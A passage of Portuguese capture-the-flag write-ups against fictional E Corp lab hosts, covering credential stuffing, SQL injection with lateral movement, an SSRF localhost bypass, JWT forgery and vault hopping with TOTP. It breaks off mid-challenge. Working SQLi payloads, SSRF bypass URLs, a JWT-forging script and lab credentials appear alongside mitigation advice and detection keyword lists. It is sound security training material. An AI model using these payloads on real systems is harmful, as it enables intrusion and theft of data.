número de falhas por janela temporal
```

Também deve aplicar bloqueios temporários progressivos.

---

### 13.4. Monitorizar tentativas de login

Devem existir alertas para:

```text
muitas tentativas falhadas
muitos usernames diferentes a partir do mesmo IP
padrões de credential stuffing
uso de credenciais antigas conhecidas
```

---

### 13.5. Evitar mensagens ambíguas no script de deteção

Do ponto de vista defensivo, a aplicação deve manter respostas uniformes. Do ponto de vista ofensivo, é importante não considerar HTTP `200` como sucesso sem validar o conteúdo da resposta.

---

## 14. Conclusão

Neste desafio foi explorado um cenário de brute force/credential stuffing contra o portal de colaboradores da E Corp.

A aplicação tinha proteção CSRF e rate limiting, pelo que não era possível simplesmente enviar pedidos POST repetidos sem controlo. Foi necessário criar um script que, para cada tentativa, obtinha um token CSRF válido, mantinha cookies de sessão e tratava respostas HTTP `429`.

Após corrigir a lógica inicial para evitar falsos positivos, foi encontrada uma credencial válida:

```text
michael.hansen@ecorp.com:Tr0ub4dor&3
```

O login válido resultou em HTTP `302` e permitiu aceder à área autenticada, onde foi obtida a flag:

![Crencias e resposta 302](resources/2026-05-26-11-38-06.png)

![Flag](resources/2026-05-26-11-37-15.png)

```text
FLAG{ch16_2bcca1d7a55d88c137a4a869b878541c}
```

O desafio demonstra que CSRF tokens e rate limiting dificultam automação, mas não impedem credential stuffing quando existem credenciais válidas reutilizadas.


# CH17

## 1. Identificação do desafio

**Categoria:** Network — Lateral Movement  
**Alvo inicial:** `http://ch17-dmz-web`  
**Objetivo:** Aceder progressivamente a três segmentos internos da rede até chegar à base de dados restrita onde se encontrava a informação do projeto Whiterose e a flag.

---

## 2. Contexto inicial

O desafio indicava que os dados do projeto de Whiterose estavam numa zona restrita da E Corp, protegida por vários segmentos de rede.

A descrição indicava a existência de três fases principais:

```text
Web server na DMZ
→ Jump box intermédio
→ Base de dados interna restrita
```

A página inicial acessível era:

```text
http://ch17-dmz-web
```

A aplicação apresentava um portal de pesquisa de empregados da E Corp.

---

## 3. Análise do portal DMZ

A primeira aplicação encontrada era um portal web com uma funcionalidade de pesquisa de empregados.

A tabela visível apresentava dados como:

```text
Name
Department
Email
```

Foram observados vários empregados e emails internos da E Corp.

Como o campo de pesquisa refletia resultados vindos de uma base de dados, foi testada a possibilidade de SQL Injection.

---

## 4. Confirmação de SQL Injection

Foram testados payloads simples no campo de pesquisa:

```sql
' OR '1'='1
```

e:

```sql
' OR '1'='1'-- -
```

A aplicação aceitou os payloads e devolveu múltiplos resultados, confirmando que o campo de pesquisa era vulnerável a SQL Injection.

---

## 5. Enumeração do número de colunas

Para conseguir usar `UNION SELECT`, foi necessário descobrir o número de colunas da query original.

Foi testado:

```sql
' UNION SELECT 1,2,3-- -
```

Este payload funcionou e apresentou os valores na tabela.

Ao testar com quatro colunas, a aplicação devolveu erro, confirmando que a query original tinha **3 colunas**.

Assim, a estrutura usada para os payloads foi:

```sql
' UNION SELECT coluna1,coluna2,coluna3-- -
```

---

## 6. Identificação do motor de base de dados

Foi testado o seguinte payload:

```sql
' UNION SELECT 1,sqlite_version(),3-- -
```

A aplicação devolveu:

```text
3.46.1
```

Isto confirmou que a base de dados usada pelo portal DMZ era **SQLite**.

---

## 7. Enumeração das tabelas SQLite

Com a confirmação de SQLite, foi consultada a tabela `sqlite_master` para listar as tabelas existentes:

```sql
' UNION SELECT 1,group_concat(name),3 FROM sqlite_master WHERE type='table'-- -
```

O resultado revelou as seguintes tabelas:

```text
employees
system_accounts
```

A tabela `employees` correspondia aos dados visíveis no portal. A tabela interessante para lateral movement era:

```text
system_accounts
```

---

## 8. Análise da estrutura das tabelas

Foi consultada a estrutura da tabela `system_accounts`:

```sql
' UNION SELECT 1,sql,3 FROM sqlite_master WHERE name='system_accounts'-- -
```

O resultado foi:

```sql
CREATE TABLE system_accounts (
  id INTEGER PRIMARY KEY,
  hostname TEXT NOT NULL,
  service TEXT NOT NULL,
  username TEXT NOT NULL,
  password TEXT NOT NULL
)
```

Também foi verificada a tabela `employees`:

```sql
' UNION SELECT 1,sql,3 FROM sqlite_master WHERE name='employees'-- -
```

Resultado:

```sql
CREATE TABLE employees (
  id INTEGER PRIMARY KEY,
  name TEXT NOT NULL,
  department TEXT NOT NULL,
  email TEXT NOT NULL
)
```

A tabela `system_accounts` continha claramente credenciais e hosts internos.

---

## 9. Extração de credenciais para o jump box

Foi extraída informação da tabela `system_accounts`.

O resultado relevante foi:

```text
ch17-jumpbox:ssh:netadmin:Jump$h3ll_2019
```

Foram assim obtidas as credenciais para o segundo segmento:

```text
Host: ch17-jumpbox
Service: ssh
Username: netadmin
Password: Jump$h3ll_2019
```

---

## 10. Acesso ao jump box

Com as credenciais extraídas da base de dados da DMZ, foi feito login por SSH no jump box:

```bash
ssh netadmin@ch17-jumpbox
```

A password usada foi:

```text
Jump$h3ll_2019
```

Após autenticação, o acesso passou para o host intermédio da rede interna.

---

## 11. Enumeração no jump box

No diretório home do utilizador `netadmin`, foram listados os ficheiros:

```bash
ls -ltra
```

Foram encontrados ficheiros como:

```text
.bash_history
.psql_history
```

A análise do ficheiro `.bash_history` revelou comandos anteriores relacionados com Redis e PostgreSQL:

```bash
redis-cli -h ch17-redis INFO
redis-cli -h ch17-redis KEYS *
redis-cli -h ch17-redis GET "ecorp:db:credentials"
redis-cli -h ch17-redis GET "ecorp:internal:note"
psql -h ch17-db -U ecorp_finance -d restricted_data
```

Isto indicava que o próximo passo era consultar o Redis interno para obter credenciais da base de dados.

---

## 12. Consulta ao Redis interno

A partir do jump box, foi consultado o Redis interno:

```bash
redis-cli -h ch17-redis GET "ecorp:redis:version"
```

Resultado:

```text
E Corp Internal Cache — v7.2
```

Depois foi consultada a chave com credenciais da base de dados:

```bash
redis-cli -h ch17-redis GET "ecorp:db:credentials"
```

O resultado foi:

```json
{
  "host": "ch17-db",
  "port": 5432,
  "user": "ecorp_finance",
  "password": "F1n4nc3_DB_2020!",
  "database": "restricted_data"
}
```

Também foi lida a nota interna:

```bash
redis-cli -h ch17-redis GET "ecorp:internal:note"
```

Resultado:

```text
Database migrated to restricted segment. Access via jumpbox only.
```

Esta nota confirmou que a base de dados só era acessível através do jump box.

---

## 13. Acesso ao PostgreSQL interno

Com as credenciais obtidas no Redis, foi feito acesso à base de dados PostgreSQL:

```bash
psql -h ch17-db -U ecorp_finance -d restricted_data
```

Password usada:

```text
F1n4nc3_DB_2020!
```

Após autenticação, foi obtida uma shell interativa do PostgreSQL na base de dados:

```text
restricted_data
```

---

## 14. Enumeração da base de dados

Dentro do `psql`, foram listadas as tabelas:

```sql
\dt
```

Resultado:

```text
Schema |       Name        | Type  | Owner
-------+-------------------+-------+---------------
public | financial_records | table | ecorp_finance
public | whiterose_project | table | ecorp_finance
```

Foram também listadas as relações com:

```sql
\d
```

O resultado confirmou a existência das tabelas:

```text
financial_records
whiterose_project
```

A tabela mais relevante para o objetivo era:

```text
whiterose_project
```

---

## 15. Leitura dos dados do projeto Whiterose

Foi executada a consulta:

```sql
SELECT * FROM whiterose_project;
```

Resultado:

```text
id | codename           | classification   | data
---+--------------------+------------------+---------------------------------------------
1  | Project Berenstain | TOP SECRET//NOFORN | FLAG{ch17_60a0e01d84afdea9f8923ccf8fbda75d}
```

A flag foi encontrada no campo `data`.

---

## 16. Flag obtida

A flag do desafio foi:

```text
FLAG{ch17_60a0e01d84afdea9f8923ccf8fbda75d}
```

---

## 17. Cadeia de exploração

A exploração completa seguiu a seguinte sequência:

```text
Acesso ao ch17-dmz-web
→ identificação de portal de pesquisa de empregados
→ confirmação de SQL Injection
→ enumeração de colunas com UNION SELECT
→ identificação de SQLite 3.46.1
→ enumeração de tabelas via sqlite_master
→ descoberta da tabela system_accounts
→ extração de credenciais SSH para ch17-jumpbox
→ login SSH como netadmin
→ análise de .bash_history
→ identificação de Redis interno ch17-redis
→ leitura de credenciais PostgreSQL no Redis
→ ligação ao ch17-db com psql
→ enumeração das tabelas da base restricted_data
→ leitura da tabela whiterose_project
→ obtenção da flag
```

---

## 18. Vulnerabilidades identificadas

### 18.1. SQL Injection na DMZ

O portal web na DMZ permitia injetar SQL através do campo de pesquisa.

Isto permitiu consultar tabelas internas da base SQLite, incluindo uma tabela de credenciais.

---

### 18.2. Credenciais armazenadas em base de dados acessível via aplicação vulnerável

A tabela `system_accounts` continha credenciais de sistemas internos:

```text
ch17-jumpbox:ssh:netadmin:Jump$h3ll_2019
```

Estas credenciais permitiram movimento lateral para o jump box.

---

### 18.3. Histórico de comandos com informação sensível

No jump box, o `.bash_history` revelou comandos úteis e serviços internos:

```text
ch17-redis
ch17-db
ecorp:db:credentials
restricted_data
```

Isto facilitou a descoberta do próximo salto.

---

### 18.4. Credenciais de base de dados armazenadas em Redis

O Redis interno continha credenciais PostgreSQL em texto claro:

```text
ecorp:db:credentials
```

Estas credenciais permitiram acesso direto à base de dados restrita.

---

### 18.5. Segmentação insuficiente ou exposição entre segmentos

Embora a base de dados estivesse numa zona restrita, o jump box tinha acesso ao Redis e ao PostgreSQL, permitindo avançar entre segmentos depois de comprometer o host intermédio.

---

## 19. Impacto

A cadeia de falhas permitiu:

- extrair dados internos a partir de uma SQL Injection;
- obter credenciais SSH;
- aceder a um jump box interno;
- descobrir serviços internos através de histórico de comandos;
- obter credenciais de base de dados no Redis;
- aceder à base de dados restrita;
- ler dados classificados do projeto Whiterose.

Num cenário real, isto representaria um comprometimento grave da infraestrutura interna, com exposição de dados classificados.

---

## 20. Recomendações de mitigação

### 20.1. Corrigir SQL Injection

A aplicação web deve usar queries parametrizadas/prepared statements.

Input do utilizador nunca deve ser concatenado diretamente em queries SQL.

---

### 20.2. Remover credenciais de bases acessíveis pela aplicação

Credenciais de sistemas internos não devem estar armazenadas em tabelas acessíveis por aplicações expostas na DMZ.

---

### 20.3. Proteger histórico de comandos

Utilizadores administrativos devem evitar deixar comandos sensíveis no `.bash_history`.

Comandos com credenciais, nomes de serviços internos ou operações sensíveis devem ser removidos ou evitados.

---

### 20.4. Proteger Redis

O Redis deve exigir autenticação forte, limitar acesso por rede e nunca armazenar passwords em texto claro.

Credenciais devem ser geridas por secret managers apropriados.

---

### 20.5. Aplicar segmentação e princípio do menor privilégio

O jump box deve ter acesso apenas aos serviços estritamente necessários.

O acesso entre segmentos deve ser controlado por firewall, ACLs e monitorização.

---

### 20.6. Rotação de credenciais

Credenciais expostas na DMZ, no Redis ou em históricos de comandos devem ser imediatamente revogadas e substituídas.

---

## 21. Conclusão

Neste desafio foi executada uma cadeia completa de lateral movement através de três segmentos da rede da E Corp.

A partir de uma SQL Injection no portal DMZ, foi possível descobrir credenciais SSH para o jump box. No jump box, a análise do histórico de comandos revelou a existência de um Redis interno com credenciais da base de dados PostgreSQL. Essas credenciais permitiram aceder à base `restricted_data` e consultar a tabela `whiterose_project`.

A flag obtida foi:

![Flag](resources/2026-05-26-11-59-27.png)

```text
FLAG{ch17_60a0e01d84afdea9f8923ccf8fbda75d}
```

O desafio demonstra como uma vulnerabilidade inicial numa aplicação exposta pode ser combinada com má gestão de credenciais, histórico sensível e serviços internos mal protegidos para comprometer dados altamente restritos.

# CH18


## 1. Identificação do desafio

**Categoria:** Web — SSRF  
**Alvo:** `http://ch18-web`  
**Objetivo:** Explorar uma vulnerabilidade de Server-Side Request Forgery no Document Fetcher da E Corp para aceder a serviços internos disponíveis apenas em localhost e obter a flag.

---

## 2. Contexto inicial

O desafio indicava que os dados do projeto de Whiterose estavam num servidor interno atrás de um document fetcher.

A aplicação disponibilizava uma funcionalidade chamada:

```text
Internal Document Fetcher
```

Esta funcionalidade permitia introduzir um URL e pedir ao servidor para ir buscar o conteúdo desse endereço.

A descrição do desafio indicava:

```text
The fetcher proxies requests -- but it does not check where you are pointing it.
```

Isto sugeria uma vulnerabilidade de **SSRF**, onde o servidor faz pedidos HTTP em nome do utilizador para destinos controlados pelo atacante.

---

## 3. Análise inicial da aplicação

Ao aceder a:

```text
http://ch18-web
```

foi apresentada uma página com um formulário para introduzir um URL.

A aplicação indicava que suportava endpoints HTTP e HTTPS:

```text
Enter the URL of the document you wish to retrieve.
The server will fetch the content and display it below.
Supports HTTP and HTTPS endpoints.
```

Também existiam separadores para:

```text
Document Fetcher
Admin Panel
System Status
```

---

## 4. Acesso direto ao Admin Panel

Foi tentado aceder diretamente ao painel administrativo:

```text
http://ch18-web/admin
```

O resultado foi:

```text
403 Forbidden
```

Isto indicava que o painel existia, mas estava protegido contra acesso externo.

---

## 5. Consulta ao System Status

Foi acedido o endpoint:

```text
http://ch18-web/status
```

A página de status revelou serviços internos:

```text
Document Fetcher          ONLINE
Admin Panel               ONLINE (localhost only)
Internal Metadata API     ONLINE (localhost only)
Employee Directory        ONLINE (localhost only)
```

Também foi apresentada a nota:

```text
All internal services bound to 127.0.0.1:80.
External access restricted by application firewall.
```

Esta informação confirmou que existiam serviços internos acessíveis apenas a partir do próprio servidor.

---

## 6. Identificação da vulnerabilidade SSRF

Como o Document Fetcher fazia pedidos a URLs fornecidos pelo utilizador, foi possível tentar aceder a serviços internos através dele.

O acesso direto a `/admin` era bloqueado, mas o fetcher fazia os pedidos a partir do próprio servidor. Assim, serviços que estavam disponíveis apenas em localhost poderiam ser acedidos indiretamente.

A lógica da exploração era:

```text
Utilizador externo → Document Fetcher → localhost interno
```

---

## 7. Tentativas iniciais

Foram testados destinos internos comuns, como:

```text
http://127.0.0.1/admin
http://localhost/admin
```

No entanto, essas tentativas não devolveram o resultado esperado, possivelmente devido a filtros simples aplicados pela aplicação.

---

## 8. Bypass do filtro de localhost

Foi testada uma representação alternativa de localhost:

```text
http://0/admin
```

Este payload funcionou.

O endereço `0` pode resolver para o endereço local em determinados contextos, permitindo contornar filtros simples que bloqueiam apenas strings como:

```text
localhost
127.0.0.1
```

Ao submeter:

```text
http://0/admin
```

no campo do Document Fetcher, foi possível aceder ao painel administrativo interno.

---

## 9. Descoberta de endpoints internos

O conteúdo devolvido pelo painel administrativo revelou links internos:

```html
<a href="/internal/metadata">Project Metadata Service</a>
<a href="/internal/employees">Employee Directory</a>
<a href="/internal/config">System Configuration</a>
```

Os endpoints internos identificados foram:

```text
/internal/metadata
/internal/employees
/internal/config
```

Como estes endpoints também estavam protegidos por acesso localhost-only, foi necessário continuar a usar o Document Fetcher com o bypass `http://0`.

---

## 10. Acesso ao Internal Metadata API

Foi usado o seguinte URL no Document Fetcher:

```text
http://0/internal/metadata
```

A resposta devolveu dados internos em formato JSON.

O conteúdo incluía informação sobre o projeto Whiterose, classificação e um access token.

A resposta continha:

```json
{
  "access_token": "FLAG{ch18_29937576ac5cbb116cd3021cbd6ff3d9}",
  "classification": "TOP SECRET // ECORP-INTERNAL",
  "codename": "WTP-CONTINGENCY",
  "facility": "Washington Township Plant",
  "notes": "If you are reading this, the project is on schedule. The machine is nearly complete. Time is not what they think it is.",
  "principal_investigator": "Minister Zhang / Whiterose",
  "project": "Whiterose",
  "status": "ACTIVE",
  "timestamp": "2015-11-09T23:59:59Z"
}
```

---

## 11. Flag obtida

A flag estava no campo:

```text
access_token
```

Flag obtida:

```text
FLAG{ch18_29937576ac5cbb116cd3021cbd6ff3d9}
```

---

## 12. Cadeia de exploração

A exploração completa seguiu a seguinte sequência:

```text
Acesso ao ch18-web
→ análise do Document Fetcher
→ tentativa de acesso direto a /admin
→ resposta 403 Forbidden
→ consulta a /status
→ descoberta de serviços localhost-only
→ identificação de potencial SSRF
→ tentativa com localhost e 127.0.0.1
→ bypass com http://0/admin
→ acesso ao Admin Panel interno
→ descoberta dos endpoints /internal/metadata, /internal/employees e /internal/config
→ acesso a http://0/internal/metadata através do fetcher
→ leitura do metadata interno
→ obtenção da flag
```

---

## 13. Vulnerabilidade identificada

A vulnerabilidade explorada foi **Server-Side Request Forgery**.

Esta vulnerabilidade ocorre quando uma aplicação permite ao utilizador controlar um URL que será requisitado pelo servidor, sem validação adequada do destino.

Neste caso, o Document Fetcher aceitava URLs arbitrários e fazia pedidos a partir do próprio servidor. Isto permitiu aceder a serviços internos que deveriam estar disponíveis apenas em localhost.

---

## 14. Impacto

A falha permitiu:

- contornar restrições de acesso externo;
- aceder a endpoints internos localhost-only;
- visualizar o painel administrativo interno;
- descobrir endpoints internos sensíveis;
- aceder ao Internal Metadata API;
- obter informação classificada do projeto Whiterose;
- recuperar a flag.

Num ambiente real, uma SSRF deste tipo poderia permitir acesso a metadados cloud, painéis administrativos internos, APIs privadas, serviços de infraestrutura e secrets.

---

## 15. Recomendações de mitigação

### 15.1. Validar destinos permitidos

A aplicação deve permitir apenas domínios explicitamente autorizados.

Em vez de bloquear strings específicas, deve ser usada uma allowlist rigorosa.

---

### 15.2. Bloquear IPs internos e loopback

O servidor deve impedir pedidos para endereços como:

```text
127.0.0.0/8
0.0.0.0/8
10.0.0.0/8
172.16.0.0/12
192.168.0.0/16
169.254.0.0/16
::1
fc00::/7
```

---

### 15.3. Resolver DNS antes de validar

A aplicação deve resolver o domínio para IP e validar o IP final antes de fazer o pedido.

Isto ajuda a prevenir bypasses com representações alternativas ou DNS rebinding.

---

### 15.4. Impedir redirects para destinos internos

Mesmo que o URL inicial seja permitido, a aplicação deve bloquear redirects para redes internas ou localhost.

---

### 15.5. Segmentar serviços internos

Serviços administrativos e APIs internas devem exigir autenticação própria, mesmo quando acessidos a partir de localhost.

Não se deve assumir que tráfego vindo de localhost é automaticamente confiável.

---

### 15.6. Monitorizar pedidos do fetcher

Devem ser monitorizados pedidos para destinos suspeitos, como:

```text
localhost
127.0.0.1
0
metadata
internal
admin
```

---

## 16. Conclusão

Neste desafio foi explorada uma vulnerabilidade de SSRF no Document Fetcher da E Corp.

O acesso direto ao painel administrativo devolvia `403 Forbidden`, mas o endpoint `/status` revelou que o Admin Panel e o Internal Metadata API estavam disponíveis apenas em localhost.

Através do Document Fetcher, foi possível contornar esta restrição usando o URL:

```text
http://0/admin
```

Esse bypass permitiu aceder ao painel administrativo interno e descobrir o endpoint:

```text
/internal/metadata
```

De seguida, foi usado:

```text
http://0/internal/metadata
```

para aceder ao Internal Metadata API e obter a flag:

```text
FLAG{ch18_29937576ac5cbb116cd3021cbd6ff3d9}
```

O desafio demonstra como uma funcionalidade aparentemente simples de fetch remoto pode expor serviços internos quando não valida corretamente os destinos permitidos.

# CH19


## 1. Identificação do desafio

**Categoria:** Web — JWT Debug Leak  
**Alvo:** `http://ch19-web`  
**Objetivo:** Encontrar uma secret JWT exposta através de um endpoint de debug, forjar um token com privilégios de administrador e aceder ao vault.

---

## 2. Contexto inicial

O desafio apresentava o sistema de acesso ao vault da E Corp:

```text
E Corp Vault Access System
Secure Document Storage Portal v3.2.1
```

A página inicial indicava credenciais padrão:

```text
guest / guest
```

A descrição do desafio indicava que a aplicação usava autenticação JWT e que o developer tinha deixado um endpoint de debug ativo em produção.

A hint sugeria:

```text
Login as guest/guest.
Check robots.txt and the page source for clues about hidden endpoints.
```

---

## 3. Login inicial

Foi efetuado login com as credenciais indicadas:

```text
Username: guest
Password: guest
```

Após o login, foi identificado um JWT associado à sessão do utilizador guest.

O token decodificado apresentava o seguinte payload:

```json
{
  "user": "guest",
  "role": "guest",
  "name": "Guest User",
  "iat": 1779818267,
  "exp": 1779821867
}
```

Isto confirmou que a aplicação usava JWT para controlar a identidade e o papel do utilizador.

---

## 4. Análise do `robots.txt`

Foi consultado o ficheiro:

```text
http://ch19-web/robots.txt
```

O conteúdo revelou endpoints sensíveis:

```text
User-agent: *
Disallow: /api/debug
Disallow: /vault

# E Corp Vault System v3.2.1
# TODO: Remove debug endpoint before production deployment
```

Esta informação revelou dois caminhos importantes:

```text
/api/debug
/vault
```

O comentário indicava claramente que o endpoint de debug deveria ter sido removido antes da aplicação ir para produção.

---

## 5. Consulta ao endpoint de debug

Foi acedido o endpoint:

```text
/api/debug
```

O endpoint revelou informação sensível da aplicação, incluindo a configuração JWT.

O conteúdo relevante foi:

```json
{
  "application": "E Corp Vault Access System",
  "version": "3.2.1",
  "environment": "development",
  "debug_mode": true,
  "config": {
    "jwt_secret": "e-corp-vault-2015",
    "jwt_algorithm": "HS256",
    "token_expiry": "1h",
    "auth_cookie": "vault_token"
  }
}
```

A secret JWT exposta foi:

```text
e-corp-vault-2015
```

Também foi identificado que a cookie de autenticação se chamava:

```text
vault_token
```

---

## 6. Identificação da vulnerabilidade

A vulnerabilidade principal foi a exposição de informação sensível através de um endpoint de debug acessível em produção.

O endpoint revelou:

```text
JWT secret
algoritmo usado
nome da cookie de autenticação
endpoint protegido do vault
```

Como o algoritmo era HS256, a mesma secret era usada para assinar e validar tokens JWT.

Com a secret exposta, tornou-se possível criar um token válido com privilégios superiores.

---

## 7. Forja do JWT

Com a secret:

```text
e-corp-vault-2015
```

foi criado um novo token JWT com privilégios de administrador.

Payload utilizado:

```json
{
  "user": "admin",
  "role": "admin",
  "name": "Administrator",
  "iat": "<timestamp atual>",
  "exp": "<timestamp atual + 1h>"
}
```

Foi usado o algoritmo:

```text
HS256
```

Exemplo de script usado para gerar o token:

```python
import base64
import json
import time
import hmac
import hashlib

secret = b"e-corp-vault-2015"

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

header = {
    "alg": "HS256",
    "typ": "JWT"
}

payload = {
    "user": "admin",
    "role": "admin",
    "name": "Administrator",
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600
}

h = b64url(json.dumps(header, separators=(",", ":")).encode())
p = b64url(json.dumps(payload, separators=(",", ":")).encode())
s = b64url(hmac.new(secret, f"{h}.{p}".encode(), hashlib.sha256).digest())

print(f"{h}.{p}.{s}")
```

---

## 8. Substituição da cookie

Depois de gerar o token JWT forjado, foi substituído o valor da cookie de autenticação no browser.

A cookie identificada pelo endpoint de debug era:

```text
vault_token
```

O processo foi:

```text
Developer Tools
→ Storage/Application
→ Cookies
→ http://ch19-web
→ vault_token
→ substituir pelo JWT forjado
→ aceder a /vault
```

---

## 9. Acesso ao vault

Após substituir a cookie `vault_token` pelo JWT forjado, foi acedido o endpoint:

```text
http://ch19-web/vault
```

A aplicação aceitou o token como válido e apresentou:

```text
VAULT ACCESS GRANTED
Welcome, Administrator
Authentication: VALID | Role: ADMIN | Clearance: LEVEL 5
```

Isto confirmou que o token forjado tinha sido aceite com privilégios de administrador.

---

## 10. Flag obtida

A flag apresentada no vault foi:

```text
FLAG{ch19_c627d1e9b773fa7fdf38782837eab9a8}
```

---

## 11. Cadeia de exploração

A exploração completa seguiu a seguinte sequência:

```text
Acesso ao ch19-web
→ login com guest/guest
→ obtenção de JWT de utilizador guest
→ análise do payload JWT
→ consulta de robots.txt
→ descoberta de /api/debug e /vault
→ acesso a /api/debug
→ exposição de jwt_secret e auth_cookie
→ criação de JWT admin assinado com e-corp-vault-2015
→ substituição da cookie vault_token
→ acesso a /vault
→ obtenção da flag
```

---

## 12. Vulnerabilidades identificadas

### 12.1. Endpoint de debug exposto

O endpoint `/api/debug` estava acessível em produção e expunha informação sensível.

Informação exposta:

```text
jwt_secret
jwt_algorithm
auth_cookie
endpoints internos/protegidos
```

### 12.2. Secret JWT fraca e exposta

A secret JWT:

```text
e-corp-vault-2015
```

foi exposta diretamente pelo endpoint de debug.

Com esta secret, qualquer utilizador conseguia assinar tokens válidos.

### 12.3. Autorização baseada apenas em claims do JWT

A aplicação confiava no campo:

```text
role
```

do JWT para decidir o acesso ao vault.

Ao alterar o role para:

```text
admin
```

e assinar corretamente o token, foi possível obter acesso administrativo.

---

## 13. Impacto

Esta falha permitiu:

- descobrir a secret JWT;
- forjar tokens válidos;
- elevar privilégios de guest para admin;
- aceder ao vault protegido;
- obter dados classificados;
- recuperar a flag.

Num ambiente real, uma exposição deste tipo permitiria comprometer qualquer conta ou função representada através de JWTs assinados com a mesma secret.

---

## 14. Recomendações de mitigação

### 14.1. Remover endpoints de debug em produção

Endpoints de debug nunca devem estar expostos em ambientes de produção.

Se forem necessários em desenvolvimento, devem estar protegidos por autenticação forte e restrições de rede.

### 14.2. Nunca expor secrets

Secrets como `jwt_secret`, chaves privadas, tokens de API e passwords nunca devem ser devolvidos por endpoints HTTP.

### 14.3. Usar secrets fortes e rotação de chaves

Secrets JWT devem ser longas, aleatórias e geridas através de um secret manager.

Após exposição, a secret deve ser imediatamente rodada.

### 14.4. Validar autorização no backend

A aplicação deve validar permissões de forma robusta no servidor e evitar confiar apenas em claims manipuláveis dentro do JWT.

### 14.5. Monitorizar acessos a endpoints sensíveis

Acessos a endpoints como `/api/debug`, `/admin`, `/vault` e outros endpoints internos devem ser monitorizados e alertados.

---

## 15. Conclusão

Neste desafio foi explorada uma falha de JWT Debug Leak.

O endpoint `/api/debug`, descoberto através do `robots.txt`, expunha a secret JWT usada pela aplicação:

```text
e-corp-vault-2015
```

Com esta secret, foi possível forjar um JWT com `role` de administrador e substituir a cookie `vault_token` no browser.

A aplicação aceitou o token forjado, concedeu acesso ao vault e revelou a flag:

![FLAG](resources/2026-05-26-14-02-13.png)

```text
FLAG{ch19_c627d1e9b773fa7fdf38782837eab9a8}
```

O desafio demonstra o risco crítico de deixar endpoints de debug ativos em produção e de expor secrets usadas para autenticação.

# CH20

## 1. Identificação do desafio

**Categoria:** Web — Vault Hopping + TOTP  
**Alvo inicial:** `ch20-target`  
**Acesso inicial:** `ssh operator@ch20-target`  
**Password:** `endgame`  
**Objetivo:** Seguir vestígios deixados na máquina, aceder ao primeiro vault, obter credenciais e segredo TOTP para o segundo vault, autenticar com MFA e obter os dados finais do projeto Whiterose.

---

## 2. Contexto inicial

O desafio indicava que os dados finais do projeto Whiterose estavam protegidos por dois vaults com autenticação multifator.

A descrição referia:

```text
Someone already accessed the first vault from this machine -- the traces are still there.
```

Isto sugeria que a máquina inicial continha histórico, ficheiros temporários, cookies ou comandos anteriores que poderiam indicar o caminho para o primeiro vault.

---

## 3. Acesso inicial ao servidor

Foi feito login por SSH no alvo:

```bash
ssh operator@ch20-target
```

Password utilizada:

```text
endgame
```

Após o login, foi obtido acesso ao sistema como o utilizador:

```text
operator
```

---

## 4. Análise de vestígios no sistema

No diretório home do utilizador `operator`, foi analisado o histórico de comandos:

```bash
cat .bash_history
```

O histórico revelou comandos relacionados com o primeiro vault:

```bash
curl http://ch20-vault1/
curl -X POST http://ch20-vault1/login -d "username=whiterose&password=Zh4ng_Pr0j3ct!" -c /tmp/vault.cookie
curl -b /tmp/vault.cookie http://ch20-vault1/secrets
```

Esta informação revelou:

```text
Vault 1 URL: http://ch20-vault1/
Username: whiterose
Password: Zh4ng_Pr0j3ct!
Cookie: /tmp/vault.cookie
Endpoint de secrets: /secrets
```

---

## 5. Acesso ao Vault Level 1

Com base no histórico, foi repetido o login no Vault 1:

```bash
curl -i -X POST http://ch20-vault1/login -d "username=whiterose&password=Zh4ng_Pr0j3ct!" -c /tmp/vault.cookie
```

De seguida, foi usado o cookie guardado para aceder ao endpoint de secrets:

```bash
curl -i -b /tmp/vault.cookie http://ch20-vault1/secrets
```

O acesso foi concedido e foi apresentada a página:

```text
VAULT LEVEL 1 -- CLASSIFIED
Welcome, whiterose. Access granted.
```

---

## 6. Informação obtida no Vault Level 1

O Vault 1 revelou as credenciais para o Vault 2:

```text
URL: http://ch20-vault2/
Username: elliot.alderson
Password: Mr.R0b0t_2015!
```

Também revelou o segredo TOTP necessário para autenticação multifator:

```text
TOTP Secret: JBSWY3DPEHPK3PXP
```

A página indicava que o Vault 2 usava TOTP padrão:

```text
30-second window
SHA1
6 digits
```

---

## 7. Análise do formulário do Vault Level 2

Foi consultada a página do Vault 2 para confirmar os campos do formulário:

```bash
curl -s http://ch20-vault2/ | grep -iE "form|input|name|otp|totp|code"
```

O resultado mostrou:

```html
<form method="POST" action="/login">
  <label>Username</label><input name="username" required autofocus>
  <label>Password</label><input name="password" type="password" required>
  <label>TOTP Code (6 digits)</label><input name="totp" required maxlength="6" pattern="[0-9]{6}" placeholder="------">
</form>
```

Assim, os campos necessários eram:

```text
username
password
totp
```

---

## 8. Geração do código TOTP

Como o servidor `ch20-target` não tinha `python3` disponível, o código TOTP foi gerado localmente no Kali.

Foi usado o segredo:

```text
JBSWY3DPEHPK3PXP
```

com o algoritmo TOTP padrão:

```text
Base32 secret
HMAC-SHA1
janela de 30 segundos
6 dígitos
```

Exemplo de script usado para gerar o TOTP:

```python
import base64
import hmac
import hashlib
import struct
import time

secret = "JBSWY3DPEHPK3PXP"
key = base64.b32decode(secret, casefold=True)

counter = int(time.time()) // 30
msg = struct.pack(">Q", counter)

h = hmac.new(key, msg, hashlib.sha1).digest()
offset = h[-1] & 0x0f
code = (struct.unpack(">I", h[offset:offset+4])[0] & 0x7fffffff) % 1000000

print(str(code).zfill(6))
```

O código TOTP gerado tinha de ser usado rapidamente, pois muda a cada 30 segundos.

---

## 9. Problema com caractere especial na password

Na primeira tentativa de login no Vault 2, ocorreu o erro:

```text
-bash: !: event not found
```

Isto aconteceu porque a password continha o caractere `!`:

```text
Mr.R0b0t_2015!
```

No Bash, o `!` pode ativar history expansion quando usado de forma não protegida.

Para resolver, foi usado:

```bash
set +H
```

e os parâmetros foram enviados com aspas simples e campos separados.

---

## 10. Login no Vault Level 2

Após gerar um TOTP válido e corrigir o problema com o `!`, foi feito o login no Vault 2:

```bash
set +H

curl -i -X POST http://ch20-vault2/login -d 'username=elliot.alderson' -d 'password=Mr.R0b0t_2015!' -d 'totp=710107' -c /tmp/vault2.cookie
```

O código TOTP `710107` foi o código válido no momento do teste.

A resposta foi:

```text
HTTP/1.1 302 FOUND
Location: /vault
Set-Cookie: session=...
```

Isto confirmou que a autenticação foi bem-sucedida e que a aplicação redirecionou para:

```text
/vault
```

---

## 11. Acesso ao Vault final

Com a cookie de sessão guardada em `/tmp/vault2.cookie`, foi acedido o endpoint final:

```bash
curl -i -b /tmp/vault2.cookie http://ch20-vault2/vault
```

A resposta foi:

